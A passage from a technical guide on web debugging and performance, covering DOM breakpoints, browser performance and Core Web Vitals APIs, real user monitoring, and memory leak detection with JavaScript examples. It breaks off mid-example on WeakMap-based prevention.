**MutationObserver Timing** DOM breakpoints pause before modifications complete. MutationObserver callbacks execute after modifications in a separate microtask. Breakpoints fire earlier in the execution sequence.

### Advanced Debugging Patterns

**Breakpoint Cascades** Set breakpoints on multiple elements in a hierarchy to track modification propagation. Start with specific elements, then add parent breakpoints to catch unexpected changes.

**Temporary Breakpoints** Enable breakpoints only during specific user interactions by setting them in event handlers, then removing them after the interaction completes.

**Breakpoint Scripting** Use the Chrome DevTools Protocol or Firefox Remote Debugging Protocol to programmatically set DOM breakpoints based on application state or test conditions.

### Integration with Other Debugging Tools

**Combined with XHR Breakpoints** Set DOM breakpoints after XHR breakpoints to track data loading through rendering. The sequence reveals data flow from network response through DOM updates.

**Event Listener Breakpoints** Pair event listener breakpoints (click, input, etc.) with DOM breakpoints to track user interaction effects. The event triggers first, followed by resulting DOM changes.

**Exception Breakpoints** Enable exception breakpoints alongside DOM breakpoints to catch errors during DOM manipulation, especially useful for framework code that may throw during rendering.

---

## Performance Monitoring (DOM/JS)

### Performance APIs

#### Navigation Timing API

The Navigation Timing API exposes timing information for document navigation through `performance.timing` (deprecated) and `performance.getEntriesByType('navigation')`.

```javascript
const [navEntry] = performance.getEntriesByType('navigation');

// Critical metrics
const dnsTime = navEntry.domainLookupEnd - navEntry.domainLookupStart;
const tcpTime = navEntry.connectEnd - navEntry.connectStart;
const ttfb = navEntry.responseStart - navEntry.requestStart;
const domInteractive = navEntry.domInteractive - navEntry.fetchStart;
const domComplete = navEntry.domComplete - navEntry.fetchStart;
const loadComplete = navEntry.loadEventEnd - navEntry.fetchStart;
```

Key timestamps include: `fetchStart`, `domainLookupStart`, `domainLookupEnd`, `connectStart`, `secureConnectionStart`, `connectEnd`, `requestStart`, `responseStart`, `responseEnd`, `domInteractive`, `domContentLoadedEventStart`, `domContentLoadedEventEnd`, `domComplete`, `loadEventStart`, `loadEventEnd`.

#### Resource Timing API

Tracks loading performance for individual resources (scripts, stylesheets, images, XHR, fetch).

```javascript
const resources = performance.getEntriesByType('resource');

resources.forEach(resource => {
  const duration = resource.duration;
  const transferSize = resource.transferSize; // Bytes transferred
  const encodedSize = resource.encodedBodySize; // Compressed size
  const decodedSize = resource.decodedBodySize; // Uncompressed size
  
  // Check for cache hits
  if (transferSize === 0) {
    console.log(`${resource.name} served from cache`);
  }
  
  // Resource timing breakdown
  const dns = resource.domainLookupEnd - resource.domainLookupStart;
  const tcp = resource.connectEnd - resource.connectStart;
  const ttfb = resource.responseStart - resource.requestStart;
  const download = resource.responseEnd - resource.responseStart;
});
```

#### User Timing API

Creates custom performance markers and measures for application-specific timing.

```javascript
// Mark specific points
performance.mark('component-render-start');
// ... rendering logic
performance.mark('component-render-end');

// Measure duration between marks
performance.measure(
  'component-render',
  'component-render-start',
  'component-render-end'
);

const measures = performance.getEntriesByName('component-render');
console.log(`Render took ${measures[0].duration}ms`);

// Clear marks and measures
performance.clearMarks();
performance.clearMeasures();
```

#### PerformanceObserver API

Monitors performance entries asynchronously without polling, reducing overhead.

```javascript
// Observe specific entry types
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    // Process entries
    if (entry.entryType === 'largest-contentful-paint') {
      console.log('LCP:', entry.renderTime || entry.loadTime);
    }
  }
});

observer.observe({ 
  entryTypes: ['navigation', 'resource', 'paint', 'measure'],
  buffered: true // Get entries that occurred before observation
});

// Observe multiple types with different configs
observer.observe({ type: 'largest-contentful-paint', buffered: true });
observer.observe({ type: 'layout-shift', buffered: true });
```

### Core Web Vitals

#### Largest Contentful Paint (LCP)

Measures loading performance by tracking when the largest content element becomes visible.

```javascript
let lcp = 0;

const observer = new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lastEntry = entries[entries.length - 1];
  lcp = lastEntry.renderTime || lastEntry.loadTime;
  
  // Send to analytics
  sendToAnalytics({ metric: 'LCP', value: lcp });
});

observer.observe({ type: 'largest-contentful-paint', buffered: true });
```

Target: < 2.5s (good), 2.5s-4s (needs improvement), > 4s (poor)

Elements considered: `<img>`, `<image>` inside `<svg>`, `<video>`, elements with background images via CSS, block-level elements containing text.

#### First Input Delay (FID)

Measures interactivity by tracking the delay between user interaction and browser response.

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    const fid = entry.processingStart - entry.startTime;
    console.log('FID:', fid);
    
    // Additional context
    console.log('Event type:', entry.name);
    console.log('Target:', entry.target);
  }
});

observer.observe({ type: 'first-input', buffered: true });
```

Target: < 100ms (good), 100ms-300ms (needs improvement), > 300ms (poor)

Only measures discrete events: clicks, taps, key presses (not scrolling or zooming).

#### Cumulative Layout Shift (CLS)

Tracks visual stability by measuring unexpected layout shifts.

```javascript
let clsScore = 0;

const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    // Only count shifts not caused by user interaction
    if (!entry.hadRecentInput) {
      clsScore += entry.value;
      
      // Identify shifting elements
      console.log('Shifted elements:', entry.sources);
    }
  }
});

observer.observe({ type: 'layout-shift', buffered: true });
```

Target: < 0.1 (good), 0.1-0.25 (needs improvement), > 0.25 (poor)

Score = impact fraction × distance fraction. Impact fraction measures viewport area affected; distance fraction measures movement distance.

#### Interaction to Next Paint (INP)

Successor to FID, measuring overall responsiveness by tracking all interactions.

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    const duration = entry.duration;
    const interactionType = entry.name; // 'click', 'keydown', etc.
    
    console.log(`${interactionType} took ${duration}ms`);
    
    // Break down into phases
    const inputDelay = entry.processingStart - entry.startTime;
    const processingTime = entry.processingEnd - entry.processingStart;
    const presentationDelay = entry.startTime + entry.duration - entry.processingEnd;
  }
});

observer.observe({ type: 'event', buffered: true, durationThreshold: 16 });
```

Target: < 200ms (good), 200ms-500ms (needs improvement), > 500ms (poor)

### DOM Performance Monitoring

#### Mutation Observer

Monitors DOM changes efficiently without polling.

```javascript
const observer = new MutationObserver((mutations) => {
  const startTime = performance.now();
  
  mutations.forEach((mutation) => {
    if (mutation.type === 'childList') {
      console.log('Nodes added:', mutation.addedNodes.length);
      console.log('Nodes removed:', mutation.removedNodes.length);
    } else if (mutation.type === 'attributes') {
      console.log('Attribute changed:', mutation.attributeName);
    }
  });
  
  const endTime = performance.now();
  console.log(`Processing took ${endTime - startTime}ms`);
});

observer.observe(document.body, {
  childList: true,
  subtree: true,
  attributes: true,
  attributeOldValue: true,
  characterData: true
});
```

[Inference] Large numbers of mutations processed synchronously can cause performance issues; batching or debouncing may be necessary.

#### Intersection Observer

Efficiently tracks element visibility without scroll event listeners.

```javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      console.log('Element visible:', entry.intersectionRatio);
      console.log('Bounding rect:', entry.boundingClientRect);
      
      // Lazy load images
      if (entry.target.dataset.src) {
        entry.target.src = entry.target.dataset.src;
        observer.unobserve(entry.target);
      }
    }
  });
}, {
  root: null, // viewport
  rootMargin: '50px',
  threshold: [0, 0.25, 0.5, 0.75, 1]
});

document.querySelectorAll('img[data-src]').forEach(img => {
  observer.observe(img);
});
```

#### Resize Observer

Monitors element size changes without polling or resize event listeners.

```javascript
const observer = new ResizeObserver((entries) => {
  for (const entry of entries) {
    const { width, height } = entry.contentRect;
    console.log(`Element resized to ${width}x${height}`);
    
    // Access different box models
    const borderBox = entry.borderBoxSize[0];
    const contentBox = entry.contentBoxSize[0];
    
    // Respond to size changes
    if (width < 600) {
      entry.target.classList.add('compact');
    }
  }
});

observer.observe(document.querySelector('.container'));
```

### JavaScript Execution Monitoring

#### Long Tasks API

Identifies tasks blocking the main thread for > 50ms.

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('Long task detected:', entry.duration);
    console.log('Started at:', entry.startTime);
    
    // Attribution data (limited for privacy)
    if (entry.attribution) {
      console.log('Container type:', entry.attribution[0].containerType);
      console.log('Container name:', entry.attribution[0].containerName);
    }
  }
});

observer.observe({ type: 'longtask', buffered: true });
```

Breaking up long tasks:

```javascript
// Using setTimeout to yield to browser
function processLargeArray(items) {
  let index = 0;
  const chunkSize = 100;
  
  function processChunk() {
    const end = Math.min(index + chunkSize, items.length);
    
    for (; index < end; index++) {
      // Process item
      heavyOperation(items[index]);
    }
    
    if (index < items.length) {
      setTimeout(processChunk, 0);
    }
  }
  
  processChunk();
}

// Using requestIdleCallback
function deferredWork(items) {
  function process(deadline) {
    while (deadline.timeRemaining() > 0 && items.length > 0) {
      const item = items.shift();
      heavyOperation(item);
    }
    
    if (items.length > 0) {
      requestIdleCallback(process);
    }
  }
  
  requestIdleCallback(process);
}
```

#### Frame Timing

Monitor frame rate and identify janky frames.

```javascript
let lastFrameTime = performance.now();
let frameCount = 0;
let droppedFrames = 0;

function measureFrame(currentTime) {
  const delta = currentTime - lastFrameTime;
  
  // 60 FPS = ~16.67ms per frame
  if (delta > 16.67 * 2) {
    droppedFrames++;
    console.warn(`Dropped frame: ${delta.toFixed(2)}ms`);
  }
  
  frameCount++;
  lastFrameTime = currentTime;
  
  requestAnimationFrame(measureFrame);
}

requestAnimationFrame(measureFrame);

// Calculate average FPS
setInterval(() => {
  const fps = frameCount;
  frameCount = 0;
  console.log(`FPS: ${fps}, Dropped: ${droppedFrames}`);
  droppedFrames = 0;
}, 1000);
```

#### Memory Monitoring

```javascript
// Non-standard, Chrome only
if (performance.memory) {
  console.log('Used JS heap:', performance.memory.usedJSHeapSize / 1048576, 'MB');
  console.log('Total JS heap:', performance.memory.totalJSHeapSize / 1048576, 'MB');
  console.log('Heap limit:', performance.memory.jsHeapSizeLimit / 1048576, 'MB');
}

// Detect memory leaks
let baseline = performance.memory?.usedJSHeapSize;

setInterval(() => {
  if (performance.memory) {
    const current = performance.memory.usedJSHeapSize;
    const increase = ((current - baseline) / baseline) * 100;
    
    if (increase > 50) {
      console.warn('Potential memory leak detected');
    }
  }
}, 60000);
```

[Unverified] The `performance.memory` API is non-standard and may not be available in all browsers or environments.

### Paint Timing

#### First Paint (FP) and First Contentful Paint (FCP)

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.name === 'first-paint') {
      console.log('FP:', entry.startTime);
    }
    if (entry.name === 'first-contentful-paint') {
      console.log('FCP:', entry.startTime);
    }
  }
});

observer.observe({ type: 'paint', buffered: true });
```

FCP Target: < 1.8s (good), 1.8s-3s (needs improvement), > 3s (poor)

#### Time to Interactive (TTI)

[Inference] TTI typically requires calculation based on multiple metrics:

```javascript
function calculateTTI() {
  const navEntry = performance.getEntriesByType('navigation')[0];
  const longTasks = performance.getEntriesByType('longtask');
  
  // Simplified: find first 5s window with no long tasks after FCP
  const fcp = performance.getEntriesByName('first-contentful-paint')[0]?.startTime || 0;
  
  let tti = fcp;
  const windowSize = 5000;
  
  for (let time = fcp; time < navEntry.loadEventEnd; time += 100) {
    const hasLongTask = longTasks.some(task => 
      task.startTime >= time && task.startTime < time + windowSize
    );
    
    if (!hasLongTask) {
      tti = time;
      break;
    }
  }
  
  return tti;
}
```

### Network Performance

#### Resource Prioritization

```javascript
// Check resource priority (Chrome DevTools Protocol)
const resources = performance.getEntriesByType('resource');

resources.forEach(resource => {
  // Server timing
  if (resource.serverTiming) {
    resource.serverTiming.forEach(timing => {
      console.log(`${timing.name}: ${timing.duration}ms`);
    });
  }
  
  // Protocol and connection info
  console.log('Protocol:', resource.nextHopProtocol); // 'h2', 'h3', etc.
  console.log('Render blocking:', resource.renderBlockingStatus);
});
```

#### Connection Timing

```javascript
const navEntry = performance.getEntriesByType('navigation')[0];

// Connection establishment
const dnsTime = navEntry.domainLookupEnd - navEntry.domainLookupStart;
const tcpTime = navEntry.connectEnd - navEntry.connectStart;
const tlsTime = navEntry.connectEnd - navEntry.secureConnectionStart;

// Request/response
const requestTime = navEntry.responseStart - navEntry.requestStart;
const responseTime = navEntry.responseEnd - navEntry.responseStart;
const totalTime = navEntry.responseEnd - navEntry.fetchStart;

console.log(`DNS: ${dnsTime}ms, TCP: ${tcpTime}ms, TLS: ${tlsTime}ms`);
console.log(`Request: ${requestTime}ms, Response: ${responseTime}ms`);
```

### Real User Monitoring (RUM)

#### Web Vitals Library Integration

```javascript
import {onCLS, onFID, onLCP, onFCP, onTTFB, onINP} from 'web-vitals';

function sendToAnalytics(metric) {
  const body = JSON.stringify({
    name: metric.name,
    value: metric.value,
    rating: metric.rating,
    delta: metric.delta,
    id: metric.id,
    navigationType: metric.navigationType
  });
  
  // Use sendBeacon for reliability
  navigator.sendBeacon('/analytics', body);
}

onCLS(sendToAnalytics);
onFID(sendToAnalytics);
onLCP(sendToAnalytics);
onFCP(sendToAnalytics);
onTTFB(sendToAnalytics);
onINP(sendToAnalytics);
```

#### Custom Metrics Collection

```javascript
class PerformanceMonitor {
  constructor() {
    this.metrics = {};
    this.observers = new Map();
    this.init();
  }
  
  init() {
    this.observeNavigation();
    this.observeResources();
    this.observeLongTasks();
    this.observeLayoutShifts();
    this.setupCustomMarks();
  }
  
  observeNavigation() {
    const observer = new PerformanceObserver((list) => {
      const [entry] = list.getEntries();
      this.metrics.navigation = {
        dns: entry.domainLookupEnd - entry.domainLookupStart,
        tcp: entry.connectEnd - entry.connectStart,
        ttfb: entry.responseStart - entry.requestStart,
        domInteractive: entry.domInteractive,
        domComplete: entry.domComplete,
        loadComplete: entry.loadEventEnd
      };
    });
    
    observer.observe({ type: 'navigation', buffered: true });
    this.observers.set('navigation', observer);
  }
  
  observeResources() {
    const observer = new PerformanceObserver((list) => {
      list.getEntries().forEach(entry => {
        const type = this.getResourceType(entry.name);
        
        if (!this.metrics.resources) {
          this.metrics.resources = {};
        }
        
        if (!this.metrics.resources[type]) {
          this.metrics.resources[type] = {
            count: 0,
            totalSize: 0,
            totalDuration: 0
          };
        }
        
        this.metrics.resources[type].count++;
        this.metrics.resources[type].totalSize += entry.transferSize;
        this.metrics.resources[type].totalDuration += entry.duration;
      });
    });
    
    observer.observe({ type: 'resource', buffered: true });
    this.observers.set('resources', observer);
  }
  
  observeLongTasks() {
    const observer = new PerformanceObserver((list) => {
      if (!this.metrics.longTasks) {
        this.metrics.longTasks = {
          count: 0,
          totalDuration: 0,
          maxDuration: 0
        };
      }
      
      list.getEntries().forEach(entry => {
        this.metrics.longTasks.count++;
        this.metrics.longTasks.totalDuration += entry.duration;
        this.metrics.longTasks.maxDuration = Math.max(
          this.metrics.longTasks.maxDuration,
          entry.duration
        );
      });
    });
    
    observer.observe({ type: 'longtask', buffered: true });
    this.observers.set('longtasks', observer);
  }
  
  observeLayoutShifts() {
    let cls = 0;
    const observer = new PerformanceObserver((list) => {
      list.getEntries().forEach(entry => {
        if (!entry.hadRecentInput) {
          cls += entry.value;
        }
      });
      this.metrics.cls = cls;
    });
    
    observer.observe({ type: 'layout-shift', buffered: true });
    this.observers.set('layout-shift', observer);
  }
  
  setupCustomMarks() {
    // Framework-specific marks
    window.addEventListener('load', () => {
      performance.mark('page-fully-loaded');
    });
  }
  
  getResourceType(url) {
    if (url.match(/\.(js)$/)) return 'script';
    if (url.match(/\.(css)$/)) return 'stylesheet';
    if (url.match(/\.(png|jpg|jpeg|gif|webp|svg)$/)) return 'image';
    if (url.match(/\.(woff|woff2|ttf|otf)$/)) return 'font';
    return 'other';
  }
  
  getReport() {
    return {
      timestamp: Date.now(),
      url: window.location.href,
      userAgent: navigator.userAgent,
      connection: navigator.connection?.effectiveType,
      metrics: this.metrics
    };
  }
  
  sendReport(endpoint) {
    const report = this.getReport();
    navigator.sendBeacon(endpoint, JSON.stringify(report));
  }
  
  disconnect() {
    this.observers.forEach(observer => observer.disconnect());
    this.observers.clear();
  }
}

// Usage
const monitor = new PerformanceMonitor();

// Send on page visibility change
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') {
    monitor.sendReport('/api/performance');
  }
});
```

### Advanced Techniques

#### Element Timing API

Track rendering performance of specific elements.

```javascript
// Add elementtiming attribute to elements
// <img elementtiming="hero-image" src="hero.jpg" />

const observer = new PerformanceObserver((list) => {
  list.getEntries().forEach(entry => {
    console.log(`Element ${entry.identifier} rendered at ${entry.renderTime}ms`);
    console.log('Load time:', entry.loadTime);
    console.log('Size:', entry.naturalWidth, 'x', entry.naturalHeight);
  });
});

observer.observe({ type: 'element', buffered: true });
```

#### Server Timing API

Receive backend performance data.

```javascript
// Server sends header:
// Server-Timing: db;dur=53, cache;dur=2.4, app;dur=47.2

const resources = performance.getEntriesByType('resource');

resources.forEach(resource => {
  if (resource.serverTiming) {
    resource.serverTiming.forEach(timing => {
      console.log(`${timing.name}: ${timing.duration}ms`);
      if (timing.description) {
        console.log('Description:', timing.description);
      }
    });
  }
});
```

#### Performance Budget Monitoring

```javascript
class PerformanceBudget {
  constructor(budgets) {
    this.budgets = budgets;
    this.violations = [];
  }
  
  check() {
    const metrics = this.collectMetrics();
    
    Object.keys(this.budgets).forEach(metric => {
      const actual = metrics[metric];
      const budget = this.budgets[metric];
      
      if (actual > budget) {
        this.violations.push({
          metric,
          budget,
          actual,
          overage: actual - budget,
          percentage: ((actual - budget) / budget) * 100
        });
      }
    });
    
    return this.violations;
  }
  
  collectMetrics() {
    const [navEntry] = performance.getEntriesByType('navigation');
    const resources = performance.getEntriesByType('resource');
    const lcp = performance.getEntriesByType('largest-contentful-paint').slice(-1)[0];
    
    return {
      'total-page-size': resources.reduce((sum, r) => sum + r.transferSize, 0),
      'script-size': resources
        .filter(r => r.initiatorType === 'script')
        .reduce((sum, r) => sum + r.transferSize, 0),
      'image-size': resources
        .filter(r => r.initiatorType === 'img')
        .reduce((sum, r) => sum + r.transferSize, 0),
      'css-size': resources
        .filter(r => r.initiatorType === 'css')
        .reduce((sum, r) => sum + r.transferSize, 0),
      'lcp': lcp?.renderTime || lcp?.loadTime || 0,
      'dom-size': document.querySelectorAll('*').length,
      'ttfb': navEntry.responseStart - navEntry.requestStart
    };
  }
  
  report() {
    if (this.violations.length === 0) {
      console.log('✓ All performance budgets met');
      return;
    }
    
    console.warn('⚠ Performance budget violations:');
    this.violations.forEach(v => {
      console.warn(
        `${v.metric}: ${v.actual} (budget: ${v.budget}) +${v.percentage.toFixed(1)}%`
      );
    });
  }
}

// Usage
const budget = new PerformanceBudget({
  'total-page-size': 2000000, // 2MB
  'script-size': 500000, // 500KB
  'image-size': 1000000, // 1MB
  'lcp': 2500, // 2.5s
  'dom-size': 1500,
  'ttfb': 600
});

window.addEventListener('load', () => {
  setTimeout(() => {
    budget.check();
    budget.report();
  }, 0);
});
```

#### Synthetic Testing Integration

```javascript
// Lighthouse CI integration point
window.__lighthouse = {
  marks: [],
  measures: [],
  
  addMark(name) {
    const time = performance.now();
    performance.mark(name);
    this.marks.push({ name, time });
  },
  
  addMeasure(name, start, end) {
    performance.measure(name, start, end);
    const entry = performance.getEntriesByName(name, 'measure')[0];
    this.measures.push({
      name,
      duration: entry.duration,
      start: entry.startTime
    });
  },
  
  getResults() {
    return {
      marks: this.marks,
      measures: this.measures,
      vitals: this.collectVitals()
    };
  },
  
  collectVitals() {
    const lcp = performance.getEntriesByType('largest-contentful-paint').slice(-1)[0];
    const fcp = performance.getEntriesByName('first-contentful-paint')[0];
    const cls = performance.getEntriesByType('layout-shift')
      .filter(e => !e.hadRecentInput)
      .reduce((sum, e) => sum + e.value, 0);
    
    return { lcp: lcp?.renderTime, fcp: fcp?.startTime, cls };
  }
};
```

### Debugging and Profiling

#### Console Performance Marks

```javascript
console.time('operation');
// ... code
console.timeEnd('operation');

console.time('nested');
console.time('inner');
// ... code
console.timeEnd('inner');
console.timeEnd('nested');
```

#### Performance Profiling

```javascript
// Start CPU profile (Chrome DevTools only)
console.profile('myProfile');

// Code to profile
for (let i = 0; i < 1000000; i++) {
  // Heavy operation
}

console.profileEnd('myProfile');

// Memory snapshots
console.takeHeapSnapshot?.();
```

#### React DevTools Profiler

```javascript
import { Profiler } from 'react';

function onRenderCallback(
  id, // component identifier
  phase, // "mount" or "update"
  actualDuration, // time spent rendering
  baseDuration, // estimated time without memoization
  startTime,
  commitTime,
  interactions
) {
  console.log(`${id} ${phase} phase took ${actualDuration}ms`);
  
  if (actualDuration > 16) {
    console.warn('Slow render detected');
  }
}

function App() {
  return (
    <Profiler id="App" onRender={onRenderCallback}>
      <YourComponents />
    </Profiler>
  );
}
```

### Performance Optimization Patterns

#### Debouncing Performance Events

```javascript
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

// Debounce resize observations
const debouncedResize = debounce(() => {
  console.log('Resize complete');
  // Perform expensive calculations
}, 250);

window.addEventListener('resize', debouncedResize);
```

#### Request Idle Callback Pattern

```javascript
const tasks = [];

function scheduleLowPriorityWork(task) {
  tasks.push(task);
  scheduleWork();
}

function scheduleWork() {
  if (tasks.length === 0) return;
  
  requestIdleCallback((deadline) => {
    while (deadline.timeRemaining() > 0 && tasks.length > 0) {
      const task = tasks.shift();
      task();
    }
    
    if (tasks.length > 0) {
      scheduleWork();
    }
  }, { timeout: 2000 });
}
```

#### Passive Event Listeners

```javascript
// Improves scroll performance
document.addEventListener('scroll', handleScroll, { passive: true });
document.addEventListener('touchstart', handleTouch, { passive: true });

// Cannot call preventDefault() in passive listeners
// Good for read-only event handlers
```

This covers the comprehensive landscape of DOM/JS performance monitoring, from foundational APIs to advanced real-world implementation patterns.

---

## Memory Leak Detection in DOM and JavaScript

### Types of Memory Leaks in Web Applications

#### Detached DOM Trees

Detached DOM nodes are removed from the document but remain in memory because JavaScript still holds references to them. When you remove a parent node but maintain references to its children, the entire subtree remains allocated.

```javascript
let detachedNodes = [];
function createLeak() {
  const parent = document.createElement('div');
  for (let i = 0; i < 1000; i++) {
    const child = document.createElement('div');
    child.textContent = `Item ${i}`;
    parent.appendChild(child);
  }
  document.body.appendChild(parent);
  detachedNodes.push(parent.firstChild); // Keep reference to child
  document.body.removeChild(parent); // Parent removed, but child reference keeps tree alive
}
```

#### Event Listener Leaks

Event listeners that aren't removed when elements are destroyed continue to hold references to both the callback function and the element, preventing garbage collection.

```javascript
class Component {
  constructor(element) {
    this.element = element;
    this.data = new Array(100000).fill('data');
    
    // Arrow function creates closure over 'this'
    this.element.addEventListener('click', () => {
      console.log(this.data);
    });
    // Listener never removed - 'this' stays in memory
  }
}
```

#### Closure Leaks

Closures capture their entire scope chain. When closures outlive their intended lifecycle, they retain references to variables that should be garbage collected.

```javascript
function createLeak() {
  const largeData = new Array(1000000).fill('x');
  const element = document.getElementById('target');
  
  // This closure captures largeData even if it doesn't use it
  element.addEventListener('click', function() {
    console.log('clicked'); // largeData still in closure scope
  });
}
```

#### Timers and Intervals

Uncleared timers and intervals hold references to their callbacks and any captured scope, preventing garbage collection of referenced objects.

```javascript
class Widget {
  constructor() {
    this.data = new Array(100000);
    this.intervalId = setInterval(() => {
      this.update(); // Keeps 'this' and this.data alive
    }, 1000);
    // If clearInterval never called, memory never freed
  }
}
```

#### Global Variable Accumulation

Variables attached to the global scope (window) never get garbage collected, and accidentally created globals compound the issue.

```javascript
function accidentalGlobal() {
  leakedVar = 'This is now global'; // Missing 'const/let/var'
  this.alsoGlobal = 'Also leaked'; // In non-strict mode
}
```

#### Cache Without Eviction

Caches that grow unbounded without size limits or TTL policies accumulate references indefinitely.

```javascript
const cache = new Map();

function cacheData(key, value) {
  cache.set(key, value); // Never removed, grows forever
}
```

### Detection Tools and Techniques

#### Chrome DevTools Memory Profiler

**Heap Snapshots** Heap snapshots capture the complete state of JavaScript memory at a specific moment, showing all allocated objects, their sizes, and retention paths.

To take snapshots:

1. Open DevTools → Memory tab
2. Select "Heap snapshot"
3. Click "Take snapshot"
4. Perform actions that might leak memory
5. Take another snapshot
6. Compare snapshots to find retained objects

Key metrics in snapshots:

- **Shallow Size**: Memory held by the object itself
- **Retained Size**: Total memory that would be freed if the object were garbage collected (includes referenced objects)
- **Distance**: Number of steps from GC root

**Comparison View** Compare two heap snapshots to identify objects that increased between snapshots:

```javascript
// Example workflow:
// 1. Take snapshot (baseline)
// 2. Execute suspected leaking code multiple times
for (let i = 0; i < 10; i++) {
  createComponent();
  destroyComponent();
}
// 3. Force garbage collection (DevTools → Performance monitor → garbage icon)
// 4. Take second snapshot
// 5. Switch to "Comparison" view
// Look for objects with positive delta that shouldn't be retained
```

**Allocation Timeline** Records memory allocations over time, showing when objects are created and whether they're still retained.

1. Memory tab → Allocation instrumentation on timeline
2. Click "Start"
3. Perform actions
4. Stop recording
5. Blue bars = allocated and retained
6. Gray bars = allocated and freed

#### Allocation Sampling

Lower overhead than allocation timeline, samples allocations to identify functions that allocate the most memory.

```javascript
// Functions appearing frequently in allocation sampling indicate high allocation
function processLargeDataset() {
  return Array(10000).fill(0).map(x => ({
    data: new Array(100),
    timestamp: Date.now()
  }));
}
```

#### Memory Timeline (Performance Tab)

Shows memory usage over time alongside other performance metrics, useful for identifying when leaks occur during specific user interactions.

The JS Heap line should show sawtooth pattern (allocation then GC). If it continuously increases without dropping, memory is leaking.

### Detection Patterns

#### The Three-Snapshot Technique

Most reliable method for confirming leaks:

1. **Baseline snapshot**: Take initial heap snapshot
2. **Action phase**: Perform the action suspected of leaking (e.g., open/close modal 10 times)
3. **First check snapshot**: Force GC, take second snapshot
4. **Repeat action**: Perform same action 10 more times
5. **Confirmation snapshot**: Force GC, take third snapshot

**[Inference]** If objects increase proportionally to the number of action repetitions between snapshots 2 and 3, those objects are likely leaking. The repetition distinguishes leaks from legitimate cached data.

#### Detached DOM Node Detection

In heap snapshot, filter by "Detached":

- Objects marked as "Detached HTMLDivElement" (or other elements) are DOM nodes removed from the document but still in memory
- Follow retainer path to see what's keeping them alive

```javascript
// Detective work example:
// Heap snapshot shows: Detached HTMLDivElement
// Retainer path: Window → myComponents (Array) → Component → element
// Conclusion: myComponents array is keeping removed elements
```

#### Event Listener Pattern

Search heap snapshot for "EventListener" objects:

- Count should decrease when components are destroyed
- Filter by specific event types: "click", "scroll", "resize"
- Check retainers to find which code registered them

#### Closure Scope Inspection

In heap snapshot, search for function contexts and examine their captured variables:

- Look for "(closure)" in the object list
- Check captured variables for unexpected large objects
- **[Inference]** If a closure captures variables it doesn't use, refactor to limit scope

### Automated Detection

#### Performance.measureUserAgentSpecificMemory()

API for programmatically measuring memory usage (origin trial / limited browser support):

```javascript
async function checkMemory() {
  if (performance.measureUserAgentSpecificMemory) {
    const measurement = await performance.measureUserAgentSpecificMemory();
    console.log('Memory bytes:', measurement.bytes);
    return measurement.bytes;
  }
}

// Memory leak test pattern
async function testForLeak() {
  const baseline = await checkMemory();
  
  for (let i = 0; i < 100; i++) {
    createAndDestroyComponent();
  }
  
  // Force GC if possible (not available in production)
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  const afterTest = await checkMemory();
  const increase = afterTest - baseline;
  
  console.log(`Memory increased by ${increase} bytes`);
  // [Inference] Significant increase suggests leak
}
```

**[Unverified]** The API's availability and behavior varies by browser and may require specific flags or origin trials.

#### Performance.memory (Chrome-specific, deprecated)

```javascript
// Non-standard, Chrome only, increasingly restricted
if (performance.memory) {
  console.log('Used JS Heap:', performance.memory.usedJSHeapSize);
  console.log('Total JS Heap:', performance.memory.totalJSHeapSize);
  console.log('Heap Limit:', performance.memory.jsHeapSizeLimit);
}
```

**[Unverified]** This API is deprecated and may be removed. Results are intentionally imprecise for security reasons.

#### Custom Memory Tracking

Track object creation/destruction manually in development:

```javascript
class MemoryTracker {
  constructor() {
    this.trackedObjects = new Map();
    this.idCounter = 0;
  }
  
  track(object, label) {
    const id = ++this.idCounter;
    this.trackedObjects.set(id, {
      label,
      ref: new WeakRef(object),
      created: Date.now()
    });
    return id;
  }
  
  checkLeaks() {
    const leaked = [];
    for (const [id, tracked] of this.trackedObjects) {
      if (tracked.ref.deref() !== undefined) {
        leaked.push({
          id,
          label: tracked.label,
          age: Date.now() - tracked.created
        });
      }
    }
    return leaked;
  }
}

// Usage
const tracker = new MemoryTracker();

class Component {
  constructor() {
    this.trackerId = tracker.track(this, 'Component');
    this.element = document.createElement('div');
  }
  
  destroy() {
    this.element.remove();
    this.element = null;
  }
}

// After components should be destroyed
setTimeout(() => {
  console.log('Leaked objects:', tracker.checkLeaks());
}, 5000);
```

### Analysis Techniques

#### Retainer Path Analysis

The retainer path shows the chain of references keeping an object alive. Reading from bottom to top shows why an object can't be garbage collected.

Example retainer path:

```
Window (global root)
  → applicationCache (object)
    → components (Array)
      → [5] (array element)
        → element (HTMLDivElement)
          → listeners (Object)
            → click (Array)
              → [0] (function)
                → [[context]] (closure)
                  → largeData (Array) ← TARGET OBJECT
```

**[Inference]** This indicates `largeData` is retained because it's captured in a click event listener closure on an element stored in a components array.

#### Distance Metric Interpretation

Distance from GC root indicates how "deep" an object is in the reference chain:

- Distance 1: Directly referenced by a GC root (global variable, window, etc.)
- Distance 2+: Referenced through intermediate objects

Objects with high distance but high retained size **[Inference]** might indicate intermediate objects accidentally keeping large structures alive.

#### Constructor Grouping

Group objects by constructor name to identify which types are accumulating:

```javascript
// In heap snapshot summary view:
// Constructor | Objects | Shallow Size | Retained Size
// HTMLDivElement | 1,547 | 247KB | 2.1MB
// Array | 8,932 | 523KB | 8.7MB
// Object | 15,421 | 1.2MB | 4.3MB
```

Compare snapshots by constructor to see which types are growing.

#### String Duplication Analysis

Duplicate strings in heap snapshots indicate potential optimization opportunities:

- Multiple copies of same string value
- Consider string interning or constants

```javascript
// In heap snapshot, strings are deduplicated by content
// High count of identical strings suggests repeated creation
```

### Prevention Patterns

#### WeakMap and WeakSet

Use weak references for metadata storage that shouldn't prevent garbage collection:

```javascript
// Strong reference - prevents GC
const elementData = new Map();
function attachData(element, data) {
